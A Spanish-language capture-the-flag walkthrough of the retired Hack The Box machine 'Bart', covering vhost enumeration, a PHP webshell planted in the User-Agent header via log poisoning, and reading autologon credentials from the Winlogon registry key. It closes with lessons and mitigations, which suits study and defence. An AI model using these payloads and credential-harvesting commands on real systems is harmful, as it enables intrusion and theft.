---
machine: Bart
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, iis, vhosts, log-poisoning, autologon]
---

# Bart — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

IIS aloja tres vhosts. El foro filtra un usuario en un comentario HTML y el monitor reutiliza su contraseña. El chat interno es vulnerable a envenenamiento de logs: el `User-Agent` se escribe en un archivo que luego se incluye. La escalada lee credenciales de autologon en el registro.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p80 <IP>
```

- Solo IIS 10 en 80.
- `forum.bart.htb`, `monitor.bart.htb`, `internal-01.bart.htb`.

## Enumeración

```bash
ffuf -u http://<IP>/ -H 'Host: FUZZ.bart.htb' -w vhosts.txt
curl -s http://forum.bart.htb/ | grep -i harvey
```

Un comentario HTML revela a Harvey Potter. Su contraseña en el monitor permite entrar y descubrir el chat interno.

## Foothold

Se registra una cuenta en `internal-01.bart.htb`. El chat escribe el `User-Agent` en `log.txt` y una funcionalidad incluye ese archivo:

```bash
curl -s http://internal-01.bart.htb/ -A '<?php system($_GET["c"]); ?>'
curl -s "http://internal-01.bart.htb/log.php?c=whoami"
```

La webshell corre como el usuario del servicio.

## Movimiento lateral

Se revisan el registro y los perfiles. Las credenciales de autologon están en `Winlogon`:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Escalada de privilegios

```bash
runas /user:BART\Administrator /savecred "cmd.exe /c whoami"
```

Las credenciales guardadas permiten ejecutar como administrador; se obtiene una shell y se leen las flags.

## Evidencia

- Vhosts y comentario HTML.
- `log.txt` con el `User-Agent` inyectado.
- Claves de `Winlogon` redactadas.
- `whoami` como Administrator.

## Lecciones aprendidas

- Los comentarios HTML pueden filtrar personal y usuarios.
- Registrar cabeceras sin sanear es una vía de ejecución si el log se incluye.
- `AutoAdminLogon` deja credenciales recuperables.

## Mitigaciones y detección

- No incluir logs escribibles por el usuario en el servidor web.
- Sanear y codificar toda entrada antes de registrarla.
- Deshabilitar autologon y `DefaultPassword`.
- Alertar de `runas /savecred` y de escrituras en logs con etiquetas PHP.

## Referencias

- <https://www.hackthebox.com/machines/Bart>
- <https://0xdf.gitlab.io/2018/07/15/htb-bart.html>
- <https://attack.mitre.org/techniques/T1190/>
- <https://attack.mitre.org/techniques/T1552/005/>
